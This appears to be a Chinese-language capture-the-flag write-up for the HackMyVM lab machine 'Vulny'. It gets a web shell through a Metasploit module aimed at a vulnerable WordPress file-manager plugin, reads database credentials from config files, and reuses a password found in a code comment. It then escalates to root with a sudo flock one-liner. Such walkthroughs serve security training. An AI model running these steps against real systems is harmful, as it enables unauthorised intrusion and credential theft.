# Vulny

2024-11-05 https://hackmyvm.eu/machines/machine.php?vm=Vulny

## IP

192.168.5.40

## Scan

```
PORT      STATE SERVICE
80/tcp    open  http
33060/tcp open  mysqlx
```

先看 80 web 服务，主页无内容，gobuster 进行扫描，发现 secret 目录，访问 http://192.168.5.40/secret/ 提示出现错误：/etc/wordpress/config-192.168.5.40.php nor /etc/wordpress/config-168.5.40.php 提示密码在 /etc/wordpress 的相关文件中。

对 secret 对其进行目录扫描，发现 wordpress，对其扫描，发现了一个插件 wp-file-manager-6.O 寻找其是否有漏洞可以利用，在 msf 中找到了 exploit/multi/http/wp_file_manager_rce 可以进行利用，得到了 web shell。

进入到 /etc/wordpress 文件夹中，发现了数据库连接文件：

```
<?php
define('DB_NAME', 'wordpress');
define('DB_USER', 'wordpress');
define('DB_PASSWORD', 'myfuckingpassword');
define('DB_HOST', 'localhost');
define('DB_COLLATE', 'utf8_general_ci');
define('WP_CONTENT_DIR', '/usr/share/wordpress/wp-content');
?>
```

发现 /home 目录中的用户 adrian , 尝试密码是否有重用 myfuckingpassword 发现密码不对，在去查看 /usr/share/wordpress/wp-content 中的 wp-config.php 配置文件，发现其中有一个注释像是密码: idrinksomewater , 尝试 su adrian 输入 idrinksomewater 成功切换到该用户。

得到了 user flag：

```
adrian@vulny:~$ cat user.txt
HMViuploadfiles
```

sudo -l 发现 (ALL : ALL) NOPASSWD: /usr/bin/flock 进行利用：

```
adrian@vulny:~$ sudo /usr/bin/flock -u / /bin/sh
# cd /root
# cat root.txt
HMVididit
```
